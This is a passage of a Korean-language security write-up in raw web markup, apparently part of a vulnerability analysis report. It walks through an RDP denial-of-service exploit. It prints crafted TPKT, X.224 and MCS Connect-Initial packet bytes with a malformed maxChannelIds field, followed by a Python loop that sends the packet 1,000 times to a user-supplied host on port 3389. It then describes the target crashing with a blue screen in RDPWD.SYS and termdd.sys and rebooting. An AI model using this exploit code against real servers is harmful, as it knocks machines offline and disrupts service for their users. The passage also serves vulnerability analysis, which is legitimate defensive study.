class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 114.44444444444446%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAXCAYAAAALHW+jAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAF7UlEQVQ4y4WVSWxbxx3G/5ItkrIi27KcyLUSJ7aSOOImkhLF7ZEU9+WRT2/l476J1OrYpqV4i+NESF00p/bUW089FZCc9Fa0LopeUvTiOM0hQHsJeiuQXtoeDFOYr6Ckprn1D3wYzGDwm+8PzMxHLzSN0GxSYmqKBjVE/7cGW04Q0WkimhkiukJEV66MjV2dMplm6IWqnkWj8VL8lVcmiOjCENEPiOgSEb1GRBePNU1Exu9BXz7WWePw8OSVsbHz2N01Ahii55r26vNq/XR8+tUpOjlyyWgwvj4yYnhrxGC4bDAYLxtNpssmk2nmtUtvjF52+wxkOjU5ajo1YTKdOmM0jU6Onjx57lO//9w/FWXsq3TaRCho0xTIEI5OPnksExEZ/isA1Giv0zcApYgmj9eHj11P/tLnP4duZ/TfimKkX8l6Vs5pn3P++J8SKfFpJCE8TWXlL8Ox3LNlqfSst33vi9t3H/7x9v2PnnzwyU9+pxXbTyw2368druBvXAvh37oXIu8A/xr+WhDHUSwa6GdiIZ9JSUgsFyEUm0jJFSi1LrJqDflCA2K5DbW+CmEwtrYQzGowWzyw2n2wzflhs3qXBq19KYjjTNcN9FNBSyRj+QOxvHFQatw8kArrB2p58yCvdA9kff27uV671a+37/WjMf1g1rrYt80F+nYnB7PN5x8AvxKkcQyAj5YL4UxShCx0oZXWmaiuQCmuIi+3IGsdiPIKNH0NstaFVGshEhUxZ/cxl5NjLlcQQScXxrd/OPHnQcsD4AdyyS9kFAiVGlMbK4wvVKA02uALVcjtNsSVNpRuB+rmGsRuE34+gUV7gHlcHPPNh6AthpNHDo+BUaE4m8ooCBZEltVLLKkUINeayFVqkFfbSBd0qK0u9NYGSt1NLGU1WOYCzOYKsrn5EN6wer09Lk5P8+JLh0Ce163x5DIK0hpbX73L7mz+CHfefYSdax9jp/MRbpYfoFd/iI5yA+tqD1q8BpfTzxacHOO8MfCL4SjRefqbop6HrhspGpOswaUMCrEyK2YaLBUREYvwCHFpxOIC4ollKPkK8qkC9OUGcpwAh93LFhwB5nYFkZ4PRgctPxOVgcMh8sZlcyjCQ8rXWKtxnZX0dbTq76LZuoVmu4dG9TpazR4UvYta+yaCcQlmm5fZHByz2P140+LxpeeDh68Cuk50jdfcfEJARq2xZa3B0vkicnIFybyOrFBANCkildewFM8jK5XAZVVYrV5mdwTY4T20+QJvWTyUnA+eYAPgHUEPpNISUmoNglplqXwBklyBWuqi1NyCWl5FrXMThcoaGms9cHERZquXOVxBZrX7MWtZDMyaF2nW4hk+tHk9r3sSyWXoUgvr3R3Wql/HVnsburICXahCyhRREhuQ0jqqUhN8SISfS7JwhGeReB4OFxdwzQdpwb10BPyEV+KpKA8lprFMWmaJmMBSaZGlExIT80WWSSlMyOosGRWZxJeYEFWZYyHE5lxB5vZE4XByAacrSA5X6Aj446yS4CJZCEtqv5yr96VEqV/iG/1iutYX03o/n9D6ilzpC4Le1/VGPxBI9O027wub3deftXqY2eLxmy2e/7X8iJfTS5EclnQJyo0OhNUKpI0KhG4VolKHoNahbHQhrrah9zYR5nMIOThEAwlw4QwslsWQxeIh25z/CPjzZc2bSIif8Y3u4+qte4/vP9za293t7L3/fmdvd3tz/8Pe2v4Pt6/tP9jq7D9679p+OSfsSVxqvxDPfWafD31qMS++c3XWTRar9yg9UNSniimZ+G6V9Ifb9Ptvn9Dn/3hMe1/8gh7cvkMf371PvRvvkdreoNWd+xRLK0QXZoloitLhNJ173UZX33aRxeY9+qKfa9r0X9XiuGC1nDGePXPRNGqcN50yOo2jxoVRk8l5YmTE6754cQbbO6e/rlYn/qKXJr5RCy8/VfVxetM93HaHhma+D3yh69PodCZSFy4MwujqcYq9TURmIpodIjozSLq/KwphZYVQqRypXCZUq4disvxdfP0H22N9E0Qxy34AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image32\"\n        title=\"image32\"\n        src=\"/static/1be439890c11143de1679b36745ebe81/32056/image32.png\"\n        srcset=\"/static/1be439890c11143de1679b36745ebe81/e9ff0/image32.png 180w,\n/static/1be439890c11143de1679b36745ebe81/f21e7/image32.png 360w,\n/static/1be439890c11143de1679b36745ebe81/32056/image32.png 602w\"\n        sizes=\"(max-width: 602px) 100vw, 602px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>2. RDP 연결 요청 인코딩 패킷 바이트 변조</strong></p>\n<p>TPKT, X.224, COTP 패킷 바이트를 추가한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 600px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 7.222222222222221%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAABCAIAAABR8BlyAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAARUlEQVQI12Mwt3KxtXWvc/edGhA6JSh8in/o1MDwFt+QLv/QXHd/ZwdPTwdPDzsPN3sPN1t3PQNrPUMbPQMbfUMbbV1LAFfHEcnfalwIAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image33\"\n        title=\"image33\"\n        src=\"/static/6f577cca3a322b0b49a2817112615a7f/0a47e/image33.png\"\n        srcset=\"/static/6f577cca3a322b0b49a2817112615a7f/e9ff0/image33.png 180w,\n/static/6f577cca3a322b0b49a2817112615a7f/f21e7/image33.png 360w,\n/static/6f577cca3a322b0b49a2817112615a7f/0a47e/image33.png 600w\"\n        sizes=\"(max-width: 600px) 100vw, 600px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 546px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 70.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACSElEQVQoz4VSbU/TUBjtfyIkRoJijIgKaiQuhLGVsc25rSOKEOUlQCCa+K8wQUyECKO02/q2trfrvV1h3daX3eKy6miiyQJ6cvLkfLjn5p5zH2I+kU2lC8kU1We6kEwXEsk8VVhe39jd3Pr4Yjr69NlMLr+0kKRi8Vezc8k4mQkt84ksgTEOrkOv1wuCgFpcuXX7AYQwCILzc1NRFAhhp9Pp9XqO4xCe54WnMca6riOEfN//Yy4sroyMjktSFWMsCEK5XOY4TtM013VN0yQkqYqQAXUEIULI6GvY14ZRtywrl1+6M/b4++GRoqj7+1/39r4cHHw7PDyqVmWGYYk4mVlIUYlkfoAr7ze3tj+9jJDjD59H59LkQjYaS89GU3EyQyayMTITIzOEYdRt22m37QFaVstxnNfZNyOjE2dnLE3TP46Pi8XTk5PiSbFYPD1VVfVv5msL+7C6NfFoWgXAMFC5XBZEgWEYnucty7q4uCBc1w1uxvrGzpPJiK5DjLEoipIkKYqCEPI8r9lsErZtX15eYox93w9niPALl5bX7t2fAkBrNBo0TSuKUqlUdF1vt9uNRoOo1+vKFVRVDQUAoFarqSrwfT9PvRsavgsRMk2TYRiO40RRZFkWIWTb9o3PDjNnc2+Hhsd0Xe92uwCAUqkUXo0xbrVa/zD35+ra9uRUpFLhNA1wHEfTNM/zEMIw+X/apgr99RREEQDA87wsy4IgyLLMsmy/7WazGdYzgE6n0+3+3Nn9HJlJAE3zPJe/Qmh2HOf3ev4CdG6jgyLic7MAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image 6 1\"\n        title=\"image 6 1\"\n        src=\"/static/0f10d19d14e33c6c5f4ab8fdea1fa850/76aed/image-6.1.png\"\n        srcset=\"/static/0f10d19d14e33c6c5f4ab8fdea1fa850/e9ff0/image-6.1.png 180w,\n/static/0f10d19d14e33c6c5f4ab8fdea1fa850/f21e7/image-6.1.png 360w,\n/static/0f10d19d14e33c6c5f4ab8fdea1fa850/76aed/image-6.1.png 546w\"\n        sizes=\"(max-width: 546px) 100vw, 546px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>RDP 연결 요청 인코딩 부분의 패킷 바이트를 변조한 여부를 페이로드\n부분에서 확인할 수 있다.</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">buf<span class=\"token operator\">=</span>\\\"\\\"\n\nbuf<span class=\"token operator\">+=</span>\\\"\\\\x03\\\\x00\\\\x00\\\\x13\\\" \\# TPKT<span class=\"token punctuation\">,</span> Version <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> lenght <span class=\"token number\">19</span>\n\nbuf<span class=\"token operator\">+=</span>\\\"\\\\x0e\\\\xe0\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x01\\\\x00\\\\x08\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\" \\# ITU<span class=\"token operator\">-</span>T Rec X<span class=\"token punctuation\">.</span><span class=\"token number\">224</span></code></pre></div>\n<p>※ TPKT: 캡슐화 프로토콜이며 OSI 패킷을 자체 패킷의 데이터 페이로드로\n전달한 다음 결과 구조를 TCP</p>\n<p>프로토콜 통신으로 전달한 다음 패킷을 TCP/IP 패킷으로 처리한다.</p>\n<p><strong>3. Client MCS Attach User Request PDU 패킷 바이트 변조</strong></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 600px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 6.666666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAABCAYAAADeko4lAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAT0lEQVQI1yXDOwqAMBBAQc8j4l/cfIgB3TWVV7C29eLvChYOTLV6ZZkSTy6858WdDOcOxCs+GPOSEaeI7GgwNBpnKmTZaftIN/zHaaNuhA9LQCE3OURzdwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image34\"\n        title=\"image34\"\n        src=\"/static/12a6ed143d08c18d2111c414c9975cb1/0a47e/image34.png\"\n        srcset=\"/static/12a6ed143d08c18d2111c414c9975cb1/e9ff0/image34.png 180w,\n/static/12a6ed143d08c18d2111c414c9975cb1/f21e7/image34.png 360w,\n/static/12a6ed143d08c18d2111c414c9975cb1/0a47e/image34.png 600w\"\n        sizes=\"(max-width: 600px) 100vw, 600px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>패킷 바이트 변조</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 548px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 33.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABb0lEQVQY0yWPXUvCYBTH92HqUqTL+hLRZV4mzUkgWtRF2AsWXfRRxDDNCqO66WVuShkynexxyFgM0fnohD0+e2wn3H5XPw7n/+ccribJNUl6e/8s3BTz+cJd5b4myXK90Wz+1OsNRWm3Wsrz82upXCnelh8eq8Vi6eNDFEVJFCVOSGYSQjohpHkhzSeWssun9g+OcxfXh0enm1ux7Vh8uZPM8In0Tnxvl08JyYyQzPB8igOAv4DFYsEYC51SDwBEUYpE17OnlwA+IcRxnHa7bVkWpXQ+n9u2vQz7vg8A4/HYMAxKaVgHAF/fzUh04+z8ijFmWZau65qm6bpumiYO4HzfXwR4AYyx0AFArjdWVteyJzkAGI1Gw+Gw0+kYhoExns1my7DnefMA13Wn02l4EiGEMWaav9Wnl5ok93o9hFC/31cURdM0hBDGeDKZcIQQ13XDlwaDQdgSTjDGAGDbtqqqCKFut9sPUFXVcRxK6T99hVNYb/7i/AAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image 6 1 1\"\n        title=\"image 6 1 1\"\n        src=\"/static/ffcbd3ec1c6f658afe738dd2d88abcd5/a58fe/image-6.1.1.png\"\n        srcset=\"/static/ffcbd3ec1c6f658afe738dd2d88abcd5/e9ff0/image-6.1.1.png 180w,\n/static/ffcbd3ec1c6f658afe738dd2d88abcd5/f21e7/image-6.1.1.png 360w,\n/static/ffcbd3ec1c6f658afe738dd2d88abcd5/a58fe/image-6.1.1.png 548w\"\n        sizes=\"(max-width: 548px) 100vw, 548px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>바이트 변조</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">buf<span class=\"token operator\">+=</span>\\\"\\\\x03\\\\x00\\\\x00\\\\x08\\\" \\# TPKT<span class=\"token punctuation\">,</span> Version <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> length <span class=\"token number\">8</span>\n\nbuf<span class=\"token operator\">+=</span>\\\"\\\\x02\\\\xf0\\\\x80\\\" \\# ITU<span class=\"token operator\">-</span>T Rec X<span class=\"token punctuation\">.</span><span class=\"token number\">224</span></code></pre></div>\n<p><strong>4. Connect-Initial영역의 targetParameters 필드 패킷 바이트 변조</strong></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 13.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAo0lEQVQI1xXN3Q6CIBgAUJ+nGf61WaCYfAIfBiI6zK1u27rw/a9bL3BOQpm81AC9faHf1fTGsOm5Ew7kLMB1ve3B8rtpOApw9RWKipOMpYRmRZs0HBlHb9bDx4+LR9i//ilUUHrRGLRZlJ7FMIGacVxpo05pnZctydmZ0IT3I0jvpt3YqFVAsw76fw56MWYZbbQuPuwm8W9RJlNyy8qG5Kyouh950DCEdRQg4AAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image35\"\n        title=\"image35\"\n        src=\"/static/3f636ecfcdc678008ddd12c02f89b2a2/d8f62/image35.png\"\n        srcset=\"/static/3f636ecfcdc678008ddd12c02f89b2a2/e9ff0/image35.png 180w,\n/static/3f636ecfcdc678008ddd12c02f89b2a2/f21e7/image35.png 360w,\n/static/3f636ecfcdc678008ddd12c02f89b2a2/d8f62/image35.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>변조</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 550px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA9ElEQVQI12NITctNSs6GoMSkrMLiqura5uqa5tralqamjrDwBDePwILCipralrz8ssiopMiopOiYlLT0/ITEDIa/f/78h4F///79/PEDwv779+////8Li6tMTB2ePXv288ePV69evn796u3bNx8/fvj16+evXz8Z8gvK8/LLICgnt7S4pLqtva+tvbe1rae9vS8+IcMvIKKsvLagsDwtPS86JiUhMSMuPj08IiE5JYfh4MHDJ06cPn781PHjpzZt2rp+/aYLFy5duXLt0uWrN27eys0rdXEL2LN3/+HDR3fs2L19x67Nm7dt3rJt27ad+/YdBAAkLJSVpB+jxwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image 6 1 2\"\n        title=\"image 6 1 2\"\n        src=\"/static/2304c7bac2498acf0ebac31796cdead7/dd45a/image-6.1.2.png\"\n        srcset=\"/static/2304c7bac2498acf0ebac31796cdead7/e9ff0/image-6.1.2.png 180w,\n/static/2304c7bac2498acf0ebac31796cdead7/f21e7/image-6.1.2.png 360w,\n/static/2304c7bac2498acf0ebac31796cdead7/dd45a/image-6.1.2.png 550w\"\n        sizes=\"(max-width: 550px) 100vw, 550px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">buf<span class=\"token operator\">+=</span>\\\"\\\\x01\\\\x01\\\\x04\\\\x01\\\\x01\\\\x01\\\\x01\\\\xff\\\" \n\nbuf<span class=\"token operator\">+=</span>\\\"\\\\x30\\\\x19\\\\x02\\\\x04\\\\x00\\\\x00\\\\x00\\\\x00\\\"     \\# maxChannelids</code></pre></div>\n<p><strong>5. 변조 패킷 전송 부분</strong></p>\n<p>변조 패킷 덤프를 대상 서버로 RDP 기본 포트 3389를 향해 TCP 프로토콜\n통신을 진행한다. 연결이 성사되면 변조 패킷 덤프를 전송한후 그에 대한\n응답 값을 받은 후 연결이 종료된다.</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">HOST <span class=\"token operator\">=</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token comment\"># 사용자측 인자 값 (대상 호스트 입력)</span>\n\nPORT <span class=\"token operator\">=</span> <span class=\"token number\">3389</span>        <span class=\"token comment\"># TCP/3389</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\n    <span class=\"token comment\"># IPv4 주소 사용/TCP 프로토콜 통신</span>\n\n    s <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>SOCK_STREAM<span class=\"token punctuation\">)</span>\n\n    s<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>HOST<span class=\"token punctuation\">,</span>PORT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 연결 수립</span>\n\n    <span class=\"token keyword\">print</span> <span class=\"token string\">\"sending: %d bytes\"</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span>\n\n    s<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span> <span class=\"token comment\">#페이로드 전송</span>\n\n    rec <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 대상 서버 응답 값</span>\n\n    <span class=\"token keyword\">print</span> <span class=\"token string\">\"received: %d bytes\"</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>rec<span class=\"token punctuation\">)</span>\n\n    s<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 연결 종료</span></code></pre></div>\n<h3 id=\"공격-코드-실행\" style=\"position:relative;\"><a href=\"#%EA%B3%B5%EA%B2%A9-%EC%BD%94%EB%93%9C-%EC%8B%A4%ED%96%89\" aria-label=\"공격 코드 실행 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>공격 코드 실행</h3>\n<p><strong>1. 공격 코드 동작</strong></p>\n<p>변조되어진 패킷을 TCP 프로토콜 통신을 통해 전송한다. 공격자 측에서 보낸\n페이로드를 보낸 후 대상 서버는 정상적인 RDP 패킷으로 인지한후 응답 값을\n보낸다. 공격자 측에서 인터럽트를 걸지 않는 이상 계속 패킷을 전송한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 26.666666666666668%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAkElEQVQY043NQQ6CMBCFYU4DnZmWFoQGKW2lCiLGiBjvfxWDOwmJJt/ibf68aBrn4fz07czQAjkgC2RJ+FRZmVkhjcyaVBnkFUO9ErX9NN5el+u0N6GqQ6EdUBmzPIFyZSPu/XAK98Y/ZNZJdVR5J9JA4gC0cbWOd1xzrBN0QP5jGST8X3GMOllWybD4pn/Gb9nhOc77LxLpAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image36\"\n        title=\"image36\"\n        src=\"/static/2702685067c3204d6ec008aa7aeced75/d8f62/image36.png\"\n        srcset=\"/static/2702685067c3204d6ec008aa7aeced75/e9ff0/image36.png 180w,\n/static/2702685067c3204d6ec008aa7aeced75/f21e7/image36.png 360w,\n/static/2702685067c3204d6ec008aa7aeced75/d8f62/image36.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>2. 대상 서버 BSOD 장애 발생</strong></p>\n<p><strong>2.8.7</strong> 장에서 Metasploit maxchannelids module을 통해서 점검을 한 후\n발생한 BSOD 와 공격 코드를 통해보내 발생한 BSOD를 분석해본 결과 오류가\n발생하는 파일은 RDPWD.SYS, termdd.sys 인것을 유추할 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 42.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAA7EAAAOxAGVKw4bAAACKUlEQVQozz2Ry27aUBCGB9tcfOFgH0O4GqhEqqaUS9q0iypSo/Y58gTddNNCUkACbDDmYnpZdNM3SBbdpIpCUZ+hEvu+B8hTnYOaxaf5j85o9M8/8PQ5aHkLyOOalnzSqJ7VGtWzerNydPoKtJenZvLtOwg/OprC+flveP3mO1TroDafhRO1pmocnxjm8YmsS4BQb3yDVMoH0PXurWF01opyeScIFzeC2P4pSa07UWqtBPH9GqB9oyi9ZTrtXVPqXmla71ZVuytN6/5SlI9rRemsZLn/Q9PGV+Fw6xpMc4aUTjGR8JCQCRqGx3U8PkFBsBFggITYf3O5OabTM/6vKC5q2h5VdTEctjEUYrQRstn5LpOZcZg2TW+n65MdpR7XojjcEWL/SadnW0q9rWHs//6j6+6OEHcny+MtQGsL5ZKPxaKPlrXglTkpFBaYzy8wm50jQD8gxN4Ui35gWT6WSj6Wy0vel0xOuWumCfEQ4ANCMrNAok8wErExGnU4sjy6f0vSMKDU2ZTKn4JcfoGm6SGle5hmQymd8BgAWggvSg5apoNReYy6PkFCWDZjXjlxN0gk7E3uwAsKmSmqyghlhjzCWMy5h2Wpqh2Ew9QQzbiNWtxlbvgRGKHQHoBBIEX6m2pmGFTNHipRG6Ox/TB2DLaJLDsYibCtLhEeVL5i5eEXPKx85o7YEEEYoCgOURCGPEPDcDbl8pJnaBV9PEhNeR/r2fcx7fCV/wFX0AvNQGI5fQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image37\"\n        title=\"image37\"\n        src=\"/static/73f5c20a69a40889040edd076c1c5a0d/d8f62/image37.png\"\n        srcset=\"/static/73f5c20a69a40889040edd076c1c5a0d/e9ff0/image37.png 180w,\n/static/73f5c20a69a40889040edd076c1c5a0d/f21e7/image37.png 360w,\n/static/73f5c20a69a40889040edd076c1c5a0d/d8f62/image37.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>원격 데스크톱 연결 기능이 활성화되어 있고 대상 IP 주소만 대입한 후\n공격을 수행을 하면 해당 컴퓨터는 BSOD 장애가 발생한후 일정 시간 후에\n자동 재부팅이 진행된다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 52.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAA9klEQVQoz63RTW6FIBAAYARM/CuCoICo8SIadaFijPc/zkuhafLSp6t+q4HJMAOAIAgAAMaY8zz3fbfWHsexOJOzbZvft9bu+y6lBAD4qh9JkhhjiqJgjCmlpJRa6cqp69oHSimEEPiLENL3fSlKQgillDGW5znnnBCSfWVZliUOhBB8RCkVQkROHMfYeRvvDoRQyqrrOqVk27aMMYyxTz3V+1zTNOu6juM4TdMwDGma+pQHndtToijinOc55ZxLKctvoiiKsqqE4KkThuFtf4QQhBAhhDH2sQ8+v/C/8Z1922dvN/cLrfWyLPM8n4+u69Ja/37BC5s+JmxwW1IcAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image38\"\n        title=\"image38\"\n        src=\"/static/84ecd43bb9b5a8a8e90f33a79579b119/d8f62/image38.png\"\n        srcset=\"/static/84ecd43bb9b5a8a8e90f33a79579b119/e9ff0/image38.png 180w,\n/static/84ecd43bb9b5a8a8e90f33a79579b119/f21e7/image38.png 360w,\n/static/84ecd43bb9b5a8a8e90f33a79579b119/d8f62/image38.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>이런 과정에서 그림 5‑5 나오면서 부팅 과정 대기 상태가 유지될 수 있으며\n복구를 하기 위해서는 관리자가 직접 수동으로 재부팅을 진행해야 정상\n부팅이 진행된다.</p>\n<h2 id=\"공격-기법-분석\" style=\"position:relative;\"><a href=\"#%EA%B3%B5%EA%B2%A9-%EA%B8%B0%EB%B2%95-%EB%B6%84%EC%84%9D\" aria-label=\"공격 기법 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 